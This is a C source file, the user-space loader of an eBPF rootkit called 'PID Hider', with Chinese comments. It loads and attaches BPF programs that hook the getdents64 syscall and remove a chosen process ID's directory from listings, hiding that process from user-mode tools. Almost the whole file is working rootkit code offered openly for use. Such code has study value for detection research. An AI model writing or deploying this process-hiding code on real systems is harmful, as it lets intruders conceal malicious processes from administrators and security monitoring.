#include <argp.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "common.h"
#include "common_um.h"
#include "rootkit.skel.h"
#include <bpf/libbpf.h>

const char argp_program_doc[] =
"PID Hider\n"
"\n"
"Uses eBPF to hide a process from usermode processes\n"
"By hooking the getdents64 syscall and unlinking the pid folder\n"
"\n"
"USAGE: ./rootkit -p 2222 [-t 1111]\n";



// 定义 ringbuf 回调函数
static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    printf("PID: %u, UID: %u, COMM: %s\n", e->pid, e->uid, e->comm);
    return 0;
}

struct env {
    int pid_to_hide;
}env;

static const struct argp_option opts[] = {
    { "pid-to-hide", 'p', "PID-TO-HIDE", 0, "Process ID to hide. Defaults to this program" },
    {},
};

static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'p':
        errno = 0;
        env.pid_to_hide = strtol(arg, NULL, 10);
        if (errno || env.pid_to_hide <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

int main(int argc, char *argv[]) {
    struct rootkit_bpf *skel;
    struct ring_buffer *rb = NULL;
    int err;

    /* 解析命令行参数 */
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    
    /* 执行通用设置 */
    if (!setup()) {
        fprintf(stderr, "Failed to do common setup\n");
        return 1;
    };

    /* 打开BPF程序 */
    skel = rootkit_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF skeleton\n");
        return 1;
    }
    
    /* 设置要隐藏的PID，默认为当前进程的PID */
    char pid_to_hide[10];
    if(env.pid_to_hide == 0) {
        env.pid_to_hide = getpid();
    }

    //将pid_to_hide转换为字符串，并通过rodata->pid_to_hide传递到bpf程序
    sprintf(pid_to_hide, "%d", env.pid_to_hide);
    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
    skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;

    /* 加载并验证BPF程序 */
    err = rootkit_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }

    /* 设置尾调用的映射表 */
    int index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
    int ret = bpf_map__update_elem(skel->maps.map_prog_array, &index, sizeof(index), &prog_fd, sizeof(prog_fd), BPF_ANY);
    if(ret != 0) {
        fprintf(stderr, "Failed to update map_prog_array\n");
        goto cleanup;
    }

    //BPF_ANY是创建新项或更新已有项
    index = PROG_02;
    prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
    ret = bpf_map__update_elem(skel->maps.map_prog_array, &index, sizeof(index), &prog_fd, sizeof(prog_fd), BPF_ANY);
    if(ret != 0) {
        fprintf(stderr, "Failed to update map_prog_array\n");
        goto cleanup;
    }
    
    /* 附加跟踪点 */
    err = rootkit_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        goto cleanup;
    }

    /* 设置环形缓冲区轮询 */
    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    /*打印程序运行相关信息*/
    printf("Hidding process %d\n", env.pid_to_hide);
    printf("Successfully started! Please run `sudo cat /sys/kernel/debug/tracing/trace_pipe` "
           "to see output\n");

    //6.Poll events
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C 会导致 -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling ring buffer: %d\n", err);
            break;
        }
    }

cleanup:
    /* 释放资源 */
    ring_buffer__free(rb);
    rootkit_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}